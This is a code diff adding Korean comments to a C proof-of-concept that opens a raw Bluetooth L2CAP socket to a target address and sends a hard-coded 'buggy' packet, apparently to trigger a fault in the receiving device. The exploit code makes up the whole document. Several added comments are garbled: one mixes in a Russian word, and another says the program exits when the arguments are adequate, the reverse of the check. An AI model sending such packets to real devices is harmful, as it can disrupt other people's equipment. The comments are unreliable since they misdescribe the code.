@@ -40,17 +40,32 @@ char replay_buggy_packet[]="\xB1\x01\xDB\x69\x94\x5C\x07\x4E\x0D\x9B\x2E\xF1";
 
 int main(int argc, char **argv)
 {
+	/**
+	* main 함수는 실행시 시작 함수입니다.
+	* argc는 команд 노선에서 입력된 인자 개수를, argv는 입력된 인자를 포함하는 포인터 배열을 의미합니다.
+	*/
+	
 	struct sockaddr_l2 addr;
 	int sock, sent, i;
 
+	/**
+	* 소켓 생성을 위한 구조체 변수 선언
+	*/
+
 	if(argc < 2)
 	{
+		/**
+		* 인수가 적잡하면 에러 메시지를 출력하고 종료합니다.
+		*/
 		fprintf(stderr, "%s <btaddr>\n", argv[0]);
 		exit(EXIT_FAILURE);
 	}
 	
 	if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) 
 	{
+		/**
+		* 소켓 생성이 실패하면 에러 메시지를 출력하고 종료합니다.
+		*/
 		perror("socket");
 		exit(EXIT_FAILURE);
 	}
@@ -58,8 +73,15 @@ int main(int argc, char **argv)
 	memset(&addr, 0, sizeof(addr));
 	addr.l2_family = AF_BLUETOOTH;
 
+	/**
+	* 주소 바인딩을 위한 구조체 변수 초기화
+	*/
+
 	if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
 	{
+		/**
+		* 주소 바인딩 실패하면 에러 메시지를 출력하고 종료합니다.
+		*/
 		perror("bind");
 		exit(EXIT_FAILURE);
 	}
@@ -68,12 +90,18 @@ int main(int argc, char **argv)
 	
 	if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
 	{
+		/**
+		* 연결 실패하면 에러 메시지를 출력하고 종료합니다.
+		*/
 		perror("connect");
 		exit(EXIT_FAILURE);
 	}
 	
 	if( (sent=send(sock, replay_buggy_packet, SIZE, 0)) >= 0)
 	{
+		/**
+		* 데이터 전송 성공 메시지를 출력합니다.
+		*/
 		printf("L2CAP packet sent (%d)\n", sent);
 	}
 
@@ -85,3 +113,8 @@ int main(int argc, char **argv)
 	close(sock);
 	return EXIT_SUCCESS;
 }
+
+/**
+* main 함수는 실행시 시작 함수입니다.
+* L2CAP 패킷을송신하고, 전송에 성공하면 메시지를 출력합니다.
+*/
